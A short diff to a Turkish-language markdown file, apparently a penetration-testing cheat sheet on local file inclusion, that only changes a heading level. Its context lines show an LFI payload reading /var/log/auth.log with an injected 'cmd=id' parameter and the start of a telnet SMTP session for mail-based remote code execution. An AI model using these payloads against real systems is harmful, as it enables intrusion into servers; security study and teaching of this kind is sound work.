@@ -76,7 +76,7 @@ SSH logları:
 http://example.com/index.php?page=/var/log/auth.log&cmd=id
 ```
 
-# Mail Üzerinden RCE
+## Mail Üzerinden RCE
 ```telnet
 telnet 10.10.10.10 25
 mail from: mail@example.com
